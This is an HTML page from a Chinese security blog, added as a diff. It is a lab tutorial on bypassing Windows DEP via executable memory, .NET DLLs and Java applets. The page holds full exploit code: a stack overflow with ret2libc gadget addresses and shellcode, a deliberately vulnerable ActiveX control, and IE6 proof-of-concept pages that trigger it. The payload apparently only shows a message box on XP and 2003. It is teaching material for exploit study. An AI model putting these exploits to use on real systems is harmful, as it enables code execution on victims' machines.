@@ -1,0 +1,1679 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="DEP,windows,.Net,java," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="1. 利用可执行内存1.1 实验代码 #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;windows.h&amp;gt;  char shellcode[] =      &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9">
+<meta name="keywords" content="DEP,windows,.Net,java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击DEP的方法(下)——可执行内存、.Net、Java Applet">
+<meta property="og:url" content="http://yoursite.com/2017/07/12/攻击DEP的方法-下/index.html">
+<meta property="og:site_name" content="上善若水">
+<meta property="og:description" content="1. 利用可执行内存1.1 实验代码 #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;windows.h&amp;gt;  char shellcode[] =      &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9">
+<meta property="og:image" content="http://yoursite.com/images/2017-07-12/net.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2017-07-12/set_dll_address.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2017-07-12/ie.jpg">
+<meta property="og:updated_time" content="2017-07-14T07:23:19.411Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="攻击DEP的方法(下)——可执行内存、.Net、Java Applet">
+<meta name="twitter:description" content="1. 利用可执行内存1.1 实验代码 #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;windows.h&amp;gt;  char shellcode[] =      &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9">
+<meta name="twitter:image" content="http://yoursite.com/images/2017-07-12/net.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/07/12/攻击DEP的方法-下/"/>
+
+
+
+
+
+  <title>攻击DEP的方法(下)——可执行内存、.Net、Java Applet | 上善若水</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">上善若水</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/12/攻击DEP的方法-下/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">攻击DEP的方法(下)——可执行内存、.Net、Java Applet</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-12T10:01:59+08:00">
+                2017-07-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="1-利用可执行内存"><a href="#1-利用可执行内存" class="headerlink" title="1. 利用可执行内存"></a>1. 利用可执行内存</h3><h4 id="1-1-实验代码"><a href="#1-1-实验代码" class="headerlink" title="1.1 实验代码"></a>1.1 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7C"            // pop eax retn
+    "\x0B\x1A\xBF\x7C"            // pop pop retn
+    "\xBA\xD9\xBB\x7C"            // 修正EBP
+    "\x5F\x78\xA6\x7C"            // pop retn
+    "\x08\x00\x14\x00"            // 弹出机器码在可执行空间的起始地址，转入执行用
+    "\x00\x00\x14\x00"            // 可执行内存空间地址，复制用
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax && 跳转至(pop pop retn地址)
+    "\xFF\x00\x00\x00"            // shellcode 长度
+    "\xAC\xAF\x94\x7C"            // memcpy入口
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    memcpy(str, shellcode, 450);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<h4 id="1-2-实验内容"><a href="#1-2-实验内容" class="headerlink" title="1.2 实验内容"></a>1.2 实验内容</h4><p><b>实验思路</b></p>
+<ol>
+<li>禁用GS和SafeSEH</li>
+<li>test存在溢出</li>
+<li>覆盖返回地址后，通过Ret2Libc技术，利用memcpy函数将shellcode复制到可读可写可执行区域</li>
+<li>最后在这段可执行的内存空间中执行shellcode，实现DEP的绕过</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 2003 SP2</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<p>在OllyDbg中可以看出，在0x00140000的位置，Access和Initial Access都是RWE，这代表这一段是可读可写可执行的内存，长度为0x1000。</p>
+<ol>
+<li>源内存起始地址  <font color="#f00">[ebp+0xC]</font>，用push esp jmp eax指令地址来填充，push esp后这个位置会覆盖为当前esp，以实现源内存起始地址的动态获取</li>
+<li>复制字符串长度：0xFF  <font color="#f00">[ebp+0x10]</font></li>
+<li>目的地址0x00140000  <font color="#f00">[ebp+0x8]</font></li>
+</ol>
+<p>实验中，溢出字符串起始地址0x0012FDB0，返回地址0x0012FE68<br>pop eax retn地址:0x7C84178A<br>pop pop retn地址:0x7CBF1A0B(pop ebx pop edi retn)<br>修正EBP retn 4地址:0x7CBBD9BA(push esp pop ebp retn 4)<br>pop ecx retn地址:0x7CA6785F<br>push esp jmp eax地址:0x77C97DBF(用于跳转)<br>memcpy入口地址:0x7C94AFAC</p>
+<h3 id="2-利用-NET"><a href="#2-利用-NET" class="headerlink" title="2. 利用.NET"></a>2. 利用.NET</h3><p>实验支持:</p>
+<ol>
+<li>具有溢出漏洞的ActiveX控件</li>
+<li>包含shellcode的.NET控件</li>
+<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
+</ol>
+<h4 id="2-1-ActiveX控件"><a href="#2-1-ActiveX控件" class="headerlink" title="2.1 ActiveX控件"></a>2.1 ActiveX控件</h4><p>ActiveX控件</p>
+<pre><code>
+void CVulnerAX_DEPCtrl::test(LPCTSTR str)
+{
+    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
+    // TODO: Add your dispatch handler code here
+    printf("aaaa");
+    char dest[100];
+    sprintf(dest, "%s", str);
+}
+</code></pre>
+
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>优化</td>
+<td><font color="#f00">禁用优化选项</font></td>
+<td></td>
+</tr>
+<tr>
+<td>MFC</td>
+<td>在静态库中使用MFC</td>
+<td>工程属性-&gt;General-&gt;Use of MFC</td>
+</tr>
+<tr>
+<td>字符集</td>
+<td>使用Unicode字符集</td>
+<td>工程属性-&gt;General-&gt;Character Set</td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>release版本</td>
+</tr>
+</tbody>
+</table>
+<p>编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32</p>
+<h4 id="2-2-包含shellcode的-NET控件"><a href="#2-2-包含shellcode的-NET控件" class="headerlink" title="2.2 包含shellcode的.NET控件"></a>2.2 包含shellcode的.NET控件</h4><font color="#f00">在VS2008中C#下边建立一个DLL解决方案</font>
+
+<p><img src="/images/2017-07-12/net.jpg" alt="C#下建立的DLL解决方案"></p>
+<p>包含shellcode的.NET控件代码</p>
+<pre><code>
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace DEP_NETDLL
+{
+    public class Class1
+    {
+        public void Shellcode()
+        {
+            string shellcode = 
+                "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
+                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
+                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
+                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
+                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
+                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
+                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
+                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
+                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
+                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
+                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
+                "\uff53\ufc57\uff53\uf857";
+        }
+    }
+}
+
+</code></pre>
+
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>基址</td>
+<td>0x24240000</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>Debug版本</td>
+<td>Release版本的优化会影响shellcode</td>
+</tr>
+</tbody>
+</table>
+<p>设置DLL的基址方法如下：&quot;Project-&gt;Properties-&gt;Build-&gt;Advanced&quot;<br><img src="/images/2017-07-12/set_dll_address.jpg" alt="设置DLL基址"></p>
+<h4 id="2-3-POC及测试"><a href="#2-3-POC及测试" class="headerlink" title="2.3 POC及测试"></a>2.3 POC及测试</h4><p>编译好DLL之后，需要将DLL和溢出ActiveX控件的POC页面放到同一目录下，并通过如下调试代码调用</p>
+<pre><code>&lt;object classID="DEP_NETDLL.dll#DEP_NETDLL.Shellcode"&gt;&lt;/object&gt;
+</code></pre>
+
+<p>Shellcode设置好后，就来设置POC页面，并将POC页面与.NET控件放到一台WEB服务器上，在实验机上访问这个POC页面，以触发ActiveX中的溢出漏洞，通过.NET控件绕过DEP。</p>
+<p>POC页面如下</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;object classID=&quot;DEP_NETDLL.dll#DEP_NETDLL.Class1&quot;&gt;&lt;/object&gt;
+&lt;object classid=&quot;clsid:053CC2BD-8E24-4E01-A950-9FF689F40487&quot; id=&quot;test&quot;&gt;&lt;/object&gt;
+&lt;script&gt;
+var s = &quot;\u9090&quot;;
+while(s.length &lt; 54){
+    s += &quot;\u9090&quot;;
+}
+s += &quot;\u24E2\u2424&quot;;
+test.test(s);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><b>实验解释：</b></p>
+<ol>
+<li>为了简单地反映绕过DEP的过程，本实验所攻击的ActiveX控件不启用GS</li>
+<li>通过web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的.NET控件</li>
+<li>ActiveX控件中的test函数存在典型的溢出</li>
+<li>编译.NET控件的时候，我们设置DLL的基址，所以我们将函数的返回地址覆盖为.NET控件中的shellcode起始地址，进而转入shellcode执行</li>
+<li>实验使用Unicode编码，在计算填充长度时要考虑Unicode与Ascii编码之间的长度差问题</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>浏览器</td>
+<td>IE6</td>
+</tr>
+</tbody>
+</table>
+<p>当弹出下面所示对话框时用OllyDbg附加IE的进程，附加好后按一下F9键让程序继续运行。<br><img src="/images/2017-07-12/ie.jpg" alt="对话框"></p>
+<p>然后转到DEP_NETDLL.dll的内存空间中查找shellcode的具体位置，然后进入该内存空间。</p>
+<p>shellcode的起始地址0x242424DF。而我们填充的字符串起始地址0x01EFF534，函数返回地址0x01EFF5A0，所以填充108（0x6C）字节就可以覆盖返回地址。</p>
+<font color="#f00">令人意外的是，我们无法包含dll文件，使用了所有可能的办法，都无法在html中使用dll</font>
+
+<h3 id="3-利用java-applet"><a href="#3-利用java-applet" class="headerlink" title="3. 利用java applet"></a>3. 利用java applet</h3><p>实验支持:</p>
+<ol>
+<li>具有溢出漏洞的ActiveX控件</li>
+<li>包含shellcode的Java Applet控件</li>
+<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
+</ol>
+<h4 id="3-1-ActiveX控件"><a href="#3-1-ActiveX控件" class="headerlink" title="3.1 ActiveX控件"></a>3.1 ActiveX控件</h4><p>上一讲已经介绍</p>
+<h4 id="3-2-包含shellcode的Java-Applet控件"><a href="#3-2-包含shellcode的Java-Applet控件" class="headerlink" title="3.2 包含shellcode的Java Applet控件"></a>3.2 包含shellcode的Java Applet控件</h4><p>实验代码</p>
+<pre><code>
+import java.applet.*;
+import java.awt.*;
+public class Shellcode extends Applet{
+    public void init(){
+        Runtime.getRuntime().gc();
+        StringBuffer buffer = new StringBuffer(255);
+        buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
+                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
+                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
+                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
+                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
+                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
+                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
+                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
+                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
+                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
+                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
+                "\uff53\ufc57\uff53\uf857");
+    }
+}
+</code></pre>
+
+<p>编译成class文件后，在Web中通过如下代码调用<br>    <applet code="class文件名.class"></applet></p>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>Java JDK</td>
+<td>1.4.2</td>
+<td></td>
+</tr>
+<tr>
+<td>目标版本</td>
+<td>1.1</td>
+<td>脱离JRE，在不具有JRE机器上也能执行</td>
+</tr>
+<tr>
+<td>编译指令</td>
+<td>javac 路径\Shellcode.java -target 1.1</td>
+</tr>
+</tbody>
+</table>
+<h4 id="3-3-POC及其利用"><a href="#3-3-POC及其利用" class="headerlink" title="3.3 POC及其利用"></a>3.3 POC及其利用</h4><p>编译产生的Shellcode.class与POC放到同一目录下</p>
+<p>POC页面代码</p>
+<pre><code>
+&lt;html&gt;
+&lt;body&gt;
+&lt;applet code=Shellcode.class width=300 height=50&gt;&lt;/applet&gt;
+&lt;script&gt;alert("开始溢出:");&lt;/script&gt;
+&lt;object classid="clsid:053CC2BD-8E24-4E01-A950-9FF689F40487" id="test"&gt;&lt;/object&gt;
+&lt;script&gt;
+var s = "\u9090";
+while(s.length &lt; 54){
+    s += "\u9090";
+}
+s += "\u04FC\u1001";
+test.test(s);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>代码解释:</p>
+<ol>
+<li>ActiveX不使用GS</li>
+<li>通过Web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的Java applet控件</li>
+<li>java applet的内存空间中具有可执行权限，所以我们的shellcode有执行的机会</li>
+<li>ActiveX控件中的test函数存在典型的溢出</li>
+<li>将函数的返回地址覆盖为Java Applet中的.text段的shellcode起始地址，进而转入shellcoe中执行</li>
+<li>实验用Unicode编码，需要考虑Unicode与Ascii之间的转换</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>JRE状态</td>
+<td>启用</td>
+<td></td>
+</tr>
+<tr>
+<td>Java JDK</td>
+<td>1.4.2</td>
+<td>不要使用高版本的JRE，否则Java applet申请的内存不在IE进程中</td>
+</tr>
+<tr>
+<td>浏览器</td>
+<td>IE6</td>
+</tr>
+</tbody>
+</table>
+<p>在浏览器中启用JRE：Internet选项-&gt;高级-&gt;Java-&gt;将Java……用于&lt;applet&gt;</p>
+<p>当弹出“开始溢出”对话框时用OllyDbg附加IE进程，附加好后用F9继续执行。而shellcode地址可以通过OllyFindAddr插件中的Custom-Search搜索弹出对话框机器码的前4字节&quot;FC686A0A&quot;来定位shellcode</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/DEP/" rel="tag"># DEP</a>
+          
+            <a href="/tags/windows/" rel="tag"># windows</a>
+          
+            <a href="/tags/Net/" rel="tag"># .Net</a>
+          
+            <a href="/tags/java/" rel="tag"># java</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/09/攻击DEP的方法-上/" rel="next" title="攻击DEP的方法（上）——Ret2Libc">
+                <i class="fa fa-chevron-left"></i> 攻击DEP的方法（上）——Ret2Libc
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/07/14/内存随机化保护-ASLR-简介/" rel="prev" title="内存随机化保护(ASLR)简介">
+                内存随机化保护(ASLR)简介 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/me.jpg"
+               alt="Introspelliam" />
+          <p class="site-author-name" itemprop="name">Introspelliam</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">128</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
